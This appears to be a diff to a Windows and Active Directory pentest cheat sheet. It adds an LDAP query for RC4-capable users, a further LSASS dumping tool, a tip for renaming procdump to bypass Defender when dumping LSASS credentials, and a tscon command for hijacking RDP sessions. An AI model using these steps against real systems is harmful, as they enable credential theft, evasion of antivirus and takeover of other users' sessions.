@@ -131,11 +131,36 @@ Source: [https://adsecurity.org/?p=1906](https://adsecurity.org/?p=1906)
 
 
 ### Truster Account
+
 The [PDF](https://www.sstic.org/media/SSTIC2014/SSTIC-actes/secrets_dauthentification_pisode_ii__kerberos_cont/SSTIC2014-Article-secrets_dauthentification_pisode_ii__kerberos_contre-attaque-bordes_2.pdf) from SSTIC 2014 describes trusts accounts on Windows:
 
 ```
 sAMAccountType: 805306370 = ( TRUST_ACCOUNT );
 ```
+
+
+### User by Supported Encryption Types
+
+The attribut `msDS-SupportedEncryptionTypes` containes the supported encryption
+types for an object. It's possible the search for users that support `RC4`
+encryption:
+
+```powershell
+$users = (New-Object System.DirectoryServices.DirectorySearcher("(&(ObjectClass=User)(ObjectCategory=Person)(msDS-SupportedEncryptionTypes:1.2.840.113556.1.4.804:=4))")).FindAll()
+```
+
+The data is a 32-bits unsigned in little-endian format that contains a bitwise
+of the following flags: 
+
+| Value | Description             |
+|:-----:|:-----------------------:|
+|     1 | DES-CBC-CRC             |
+|     2 | DES-CBC-MD5             |
+|     4 | RC4-HMAC                |
+|     8 | AES128-CTS-HMAC-SHA1-96 |
+|    16 | AES256-CTS-HMAC-SHA1-96 |
+
+Source: [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/6cfc7b50-11ed-4b4d-846d-6f08f0812919](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/6cfc7b50-11ed-4b4d-846d-6f08f0812919)
 
 
 ### User enumeration
@@ -188,6 +213,7 @@ There is various methods to dump the `lsass` process memory:
 - Mimikatz
 - [lsassy](https://github.com/Hackndo/lsassy)
 - [Silent Process Exit mechanism](https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/)
+- [nanodump](https://github.com/helpsystems/nanodump)
 
 
 To prevent an Administrator to dump `lsass` you can enable [LSA Protection (`RunAsPPL`)](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection).
@@ -198,6 +224,11 @@ To prevent an Administrator to dump `lsass` you can enable [LSA Protection (`Run
 ```bash
 procdump -accepteula -ma lsass.exe lsass.dmp
 ```
+
+If you rename procdump.exe to dump64.exe and place it in the
+`C:\Program Files (x86)\Microsoft Visual Studio\*` folder, you can bypass 
+Defender and dump LSASS.
+
 
 #### Rundll32 & comsvcs.dll
 
@@ -298,6 +329,7 @@ $ w32tm /query /status
 
 
 ### Windows 10 versions
+
 [Release Informations](https://docs.microsoft.com/fr-fr/windows/release-information/)
 
 
@@ -388,6 +420,21 @@ Converted 3948 frames
 net user <username> <password> /add
 # add user to local admin group, if the user is from a domain then use <domain>\<username>
 net localgroup Administrators <username> /add
+```
+
+
+### Hijack Windows session
+
+As a `SYSTEM` user, enumerate sessions with 
+
+```powershell
+query user
+```
+
+Then use the following command to hijack a user session: 
+
+```powershell
+cmd /k tscon 2 /dest:console
 ```
 
 
